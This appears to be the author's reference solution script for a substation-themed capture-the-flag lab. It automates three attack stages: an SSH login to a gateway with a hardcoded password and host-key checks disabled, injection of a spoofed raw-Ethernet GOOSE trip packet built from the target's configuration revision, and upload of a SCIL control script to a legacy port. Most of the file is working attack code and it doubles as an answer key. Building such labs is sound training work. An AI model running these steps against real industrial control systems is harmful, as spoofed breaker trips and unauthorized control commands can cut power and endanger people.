#!/usr/bin/env bash
###############################################################################
# Reference validation script — author/grader use only.
# Functions solely against this lab's seeded mock services, has no applicability
# to real IEC 61850 or MicroSCADA deployments.
#
# Usage:
#   ./red_attack_script.sh [4b|5a|5b|all]
###############################################################################
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SHARED_DIR="$(cd "${SCRIPT_DIR}/../shared" && pwd)"
RANGE_ENV="${SHARED_DIR}/range.env"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
info()  { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
err()   { echo -e "${RED}[-]${NC} $*" >&2; }
die()   { err "$@"; exit 1; }

# Load configuration
if [[ ! -f "${RANGE_ENV}" ]]; then
    die "No range.env found at ${RANGE_ENV}. Please run setup first."
fi
source "${RANGE_ENV}"

# Verify seed
if [[ -z "${INSTANCE_SEED:-}" ]]; then
    die "INSTANCE_SEED not set in range.env"
fi

STAGE="${1:-all}"
SUBSTATION_GW_IP="10.100.2.254"
BAY_CONTROLLER_IP="10.100.2.10"

# Python flag derivation helper
compute_flag() {
    local stage_name="$1"
    local artifact="$2"
    python3 - <<EOF
import hmac
import hashlib
seed = "${INSTANCE_SEED}"
flag_msg = "STAGE${stage_name}:${artifact}"
flag_hex = hmac.new(bytes.fromhex(seed), flag_msg.encode(), hashlib.sha256).hexdigest()[:16]
print(f"FLAG{{S${stage_name}-{flag_hex}}}")
EOF
}

# =============================================================================
# STAGE 4b: Gateway Compromise and Interface Enumeration
# =============================================================================
solve_4b() {
    echo "==============================================================================="
    echo " Reference validation script — author/grader use only, functions solely against"
    echo " this lab's seeded mock services, has no applicability to real deployments."
    echo "==============================================================================="
    info "Running Stage 4b validation..."
    
    # 1. SSH into substation-gw using sshpass and retrieve MAC address of process-zone interface
    info "Connecting to substation-gw (${SUBSTATION_GW_IP}) via SSH to enumerate interfaces..."
    
    # Extract interface and MAC
    MAC_ADDR=$(sshpass -p 'FieldTech2024!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null field_tech@${SUBSTATION_GW_IP} \
        "IFACE=\$(ip -o addr show | grep '10.100.3\.' | awk '{print \$2}' | head -n 1); [[ -z \"\$IFACE\" ]] && IFACE='eth1'; cat /sys/class/net/\$IFACE/address" 2>/dev/null | tr -d '\n' | tr 'A-Z' 'a-z')
        
    if [[ -z "${MAC_ADDR}" ]]; then
        die "Failed to retrieve MAC address from substation-gw"
    fi
    info "Retrieved process-zone MAC address: ${MAC_ADDR}"
    
    # 2. Compute flag
    COMPUTED_FLAG=$(compute_flag "4b" "${MAC_ADDR}")
    info "Computed Stage 4b flag: ${COMPUTED_FLAG}"
    
    # 3. Verify against stored flag
    STORED_FLAG=$(sudo -E podman exec substation-gw cat /run/ctf/stage4b_flag 2>/dev/null) || \
        warn "Could not read stored flag from substation-gw container"
        
    if [[ -n "${STORED_FLAG:-}" ]]; then
        if [[ "$COMPUTED_FLAG" == "$STORED_FLAG" ]]; then
            info "✅ STAGE 4b PASSED - Flags Match (${COMPUTED_FLAG})"
        else
            err "❌ STAGE 4b FAILED - Flag mismatch"
            err "   Computed: ${COMPUTED_FLAG}"
            err "   Stored:   ${STORED_FLAG}"
            exit 1
        fi
    else
        warn "Could not verify against stored flag - manual check required"
    fi
}

# =============================================================================
# STAGE 5a: Layer 2 Multicast (GOOSE) Injection
# =============================================================================
solve_5a() {
    echo "==============================================================================="
    echo " Reference validation script — author/grader use only, functions solely against"
    echo " this lab's seeded mock services, has no applicability to real deployments."
    echo "==============================================================================="
    info "Running Stage 5a validation..."
    
    # 1. Execute raw socket injection script on substation-gw
    info "Injecting raw L2 multicast GOOSE trip packet on substation-gw process-zone interface..."
    
    PACKET_HASH=$(sshpass -p 'FieldTech2024!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null field_tech@${SUBSTATION_GW_IP} sudo python3 - 2>/dev/null << 'EOF' | tr -d '\n'
import socket
import struct
import sys
import hashlib

# Read confRev from automation service
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.100.2.10", 102))
    s.sendall(b"READ LLN0$CF$ConfRev\n")
    conf_rev_str = s.recv(1024).decode().strip()
    conf_rev = int(conf_rev_str)
    s.close()
except Exception as e:
    print(f"Error reading confRev: {e}", file=sys.stderr)
    sys.exit(1)

# Find the interface connected to 10.100.3.0/24 subnet
import subprocess
interface = ""
output = subprocess.check_output(["ip", "-o", "addr", "show"]).decode()
for line in output.splitlines():
    if "10.100.3." in line:
        parts = line.split()
        if len(parts) > 1:
            interface = parts[1]
            break
if not interface:
    interface = "eth1"

# Read src mac address
try:
    with open(f"/sys/class/net/{interface}/address", "r") as f:
        src_mac_str = f.read().strip()
    src_mac = bytes.fromhex(src_mac_str.replace(":", ""))
except Exception as e:
    src_mac = b"\x02\x42\x0a\x64\x03\x01" # fallback

dest_mac = bytes.fromhex("010ccd018a04")

# Construct ethernet header
eth_hdr = struct.pack('!6s6sH', dest_mac, src_mac, 0x88B8)

# Construct payload
# APPID: 0x8A04
# Length: 17
# confRev: conf_rev
# sqNum: 1
# stNum: 1
# trip: 1
payload = struct.pack('!HHIIIB', 0x8A04, 17, conf_rev, 1, 1, 1)
packet = eth_hdr + payload

# Send packet on raw socket
try:
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x88B8))
    sock.bind((interface, 0))
    sock.send(packet)
    sock.close()
    
    # Print the packet hash to stdout
    h = hashlib.sha256(packet).hexdigest()
    print(h)
    sys.exit(0)
except Exception as e:
    print(f"Error sending GOOSE packet: {e}", file=sys.stderr)
    sys.exit(1)
EOF
)

    if [[ -z "${PACKET_HASH}" || "${PACKET_HASH}" =~ "Error" ]]; then
        die "Failed to send GOOSE packet or retrieve packet hash: ${PACKET_HASH}"
    fi
    info "GOOSE packet successfully injected. SHA256 of packet: ${PACKET_HASH}"
    
    # 2. Compute flag
    COMPUTED_FLAG=$(compute_flag "5a" "${PACKET_HASH}")
    info "Computed Stage 5a flag: ${COMPUTED_FLAG}"
    
    # Give the receiver a moment to write the flag file
    sleep 2
    
    # 3. Verify against stored flag in bay-controller
    STORED_FLAG=$(sudo -E podman exec bay-controller cat /run/ctf/stage5a_flag 2>/dev/null) || \
        warn "Could not read stored flag from bay-controller container"
        
    if [[ -n "${STORED_FLAG:-}" ]]; then
        if [[ "$COMPUTED_FLAG" == "$STORED_FLAG" ]]; then
            info "✅ STAGE 5a PASSED - Flags Match (${COMPUTED_FLAG})"
        else
            err "❌ STAGE 5a FAILED - Flag mismatch"
            err "   Computed: ${COMPUTED_FLAG}"
            err "   Stored:   ${STORED_FLAG}"
            exit 1
        fi
    else
        warn "Could not verify against stored flag - manual check required"
    fi
}

# =============================================================================
# STAGE 5b: Legacy SCIL Scripting Exploitation
# =============================================================================
solve_5b() {
    echo "==============================================================================="
    echo " Reference validation script — author/grader use only, functions solely against"
    echo " this lab's seeded mock services, has no applicability to real deployments."
    echo "==============================================================================="
    info "Running Stage 5b validation..."
    
    # 1. Upload valid script targeting SCIL_EXPECTED_IOA to legacy scripting port 9022
    info "Uploading SCIL control script targeting IOA ${SCIL_EXPECTED_IOA}..."
    
    # Create temp script
    TEMP_SCRIPT="/tmp/attack_script.scil"
    cat <<EOF > "${TEMP_SCRIPT}"
; SCIL control script
#SET IX:Pioa = ${SCIL_EXPECTED_IOA}
#SET IX:PValue = 1
EOF

    # Send script and capture response using Python to prevent socket-flush drops
    TOKEN_OUTPUT=$(python3 - <<EOF 2>/dev/null
import socket
import sys

script_data = "; SCIL control script\n#SET IX:Pioa = ${SCIL_EXPECTED_IOA}\n#SET IX:PValue = 1\n"
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)
    s.connect(("${BAY_CONTROLLER_IP}", 9022))
    s.sendall(script_data.encode())
    s.shutdown(socket.SHUT_WR)
    resp = s.recv(4096).decode()
    print(resp.strip())
except Exception as e:
    print(f"Error: {e}", file=sys.stderr)
    sys.exit(1)
EOF
)
    
    if [[ ! "${TOKEN_OUTPUT}" =~ ^TOKEN_OK: ]]; then
        die "Failed to receive valid token from legacy script interface. Received: ${TOKEN_OUTPUT}"
    fi
    info "Received Token: ${TOKEN_OUTPUT}"

    
    # 2. Compute flag
    COMPUTED_FLAG=$(compute_flag "5b" "${TOKEN_OUTPUT}")
    info "Computed Stage 5b flag: ${COMPUTED_FLAG}"
    
    # Give the service a moment to write the flag file
    sleep 2
    
    # 3. Verify against stored flag in bay-controller
    STORED_FLAG=$(sudo -E podman exec bay-controller cat /run/ctf/stage5b_flag 2>/dev/null) || \
        warn "Could not read stored flag from bay-controller container"
        
    if [[ -n "${STORED_FLAG:-}" ]]; then
        if [[ "$COMPUTED_FLAG" == "$STORED_FLAG" ]]; then
            info "✅ STAGE 5b PASSED - Flags Match (${COMPUTED_FLAG})"
        else
            err "❌ STAGE 5b FAILED - Flag mismatch"
            err "   Computed: ${COMPUTED_FLAG}"
            err "   Stored:   ${STORED_FLAG}"
            exit 1
        fi
    else
        warn "Could not verify against stored flag - manual check required"
    fi
}

# Execution flow control
case "${STAGE}" in
    4b)
        solve_4b
        ;;
    5a)
        solve_5a
        ;;
    5b)
        solve_5b
        ;;
    all)
        solve_4b
        echo ""
        solve_5a
        echo ""
        solve_5b
        ;;
    *)
        echo "Usage: $0 [4b|5a|5b|all]"
        exit 1
        ;;
esac

echo ""
info "=== All requested validation checks completed! ==="
